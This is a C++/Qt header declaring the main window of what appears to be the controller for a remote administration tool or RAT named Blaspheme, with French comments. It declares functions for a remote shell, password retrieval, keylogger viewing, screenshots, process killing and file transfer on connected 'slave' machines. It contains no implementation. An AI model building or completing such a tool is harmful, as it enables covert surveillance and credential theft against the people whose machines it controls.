#ifndef _MASTER_WINDOW_
#define _MASTER_WINDOW_

#include <list>

#include <QStringListModel>
//#include <QDirModel>
#include <QFileSystemModel>
#include <QMainWindow>
#include <ui_Master.h>

#include "SlaveTableModel.hpp"
#include "PasswordsDialog.hpp"
#include "EditSlaveDialog.hpp"

#include <common/Log.hpp>
#include <blaspheme/protocol/Session.hpp>
#include <network/TcpClient.hpp>

namespace Master
{
    using Network::TcpClient;
    using Blaspheme::Session;

    class ListeningThread;
    class GraphicTransferManager;
    class Slave;
    
    typedef Slave * SlavePtr;
    typedef std::list<SlavePtr> SlavePtrList;
    typedef std::list<SlavePtr>::iterator SlavePtrListIter;
    
    class MasterWindow : public QMainWindow, public Ui::MainWindow
    {
        Q_OBJECT

        public:
        
            MasterWindow(QWidget * parent = 0);
            virtual ~MasterWindow();
            //void addAuxClient(Network::TcpClient, Blaspheme::SessionId id);
            //void closeEvent(QCloseEvent *event);
            
        private:
        
            void createStatusBar();
            void updateConnected(const QString& ip, const QString& port);
            void updateDisconnected();
        
        private slots:        
        
            void onNewSlave(Session session);
            void aboutQt();
            void about();
            
            // panneau de droite : gestion des clients
            void onListen();
            void onDisconnect();
            void onChangeSlave(const QModelIndex &);
            
            // interface avec le thread des connexions
            void onDisconnectedSlave();
            void switchSlave();
            void onFailedAuth();
            
            // barre de menu : onglet client
            void configureOptions();

            // barre de menu : onglet serveur
            void shutdown();
            void reboot();
            void uninstall();
            void upgrade();

            // premier onglet : Controle Systeme Distant
            void remoteShutdown();
            void remoteReboot();
            void remoteHibernate();
            void remoteLogout();
            void remoteShell();
            void getPasswords();
            
            // 2eme onglet : gestionnaire de processus
            void updateProcessList();
            void killProcess();

            // 3eme onglet : screenshot
            void updateScreen();
            void saveScreen();

            // 4eme onglet : keylogger
            void showKeylog();
            void saveKeylog();

            // 5eme onglet : transfert de fichier
            void browseRemoteFiles(QModelIndex index);
            void startDownload();
            void startUpload();
        
        private:
        
            // Dialogue pour naviguer dans les mots de passe
            PasswordsDialog passwordsDialog;
            
            // Dialogue pour éditer des executables client
            EditSlaveDialog editSlaveDialog;
            
            // Thread d'ecoute des connexions principales et auxiliaires
            ListeningThread * listener;

            // listes de tous les clients connectes en ce moment
            SlavePtrList slaves;
            
            // ce pointeur designe le serveur que l'on est en train de controler
            SlavePtrList::iterator currentSlave;
            
            // Barre d'etat, montre les proprietes du serveur que l'on est en train de controler
            QLabel * connectionStatusLabel;
            QLabel * hostInfoIp;
            QLabel * hostInfoPort;
            QLabel * infoIp;
            QLabel * infoPort;
            
            SlaveTableModel slavesModel;
            QModelIndex currentIndex;
            QStringListModel processModel;
            //QDirModel localFilesModel;
			QFileSystemModel localFilesModel;
    };

} // Slave

#endif // _MASTER_WINDOW_
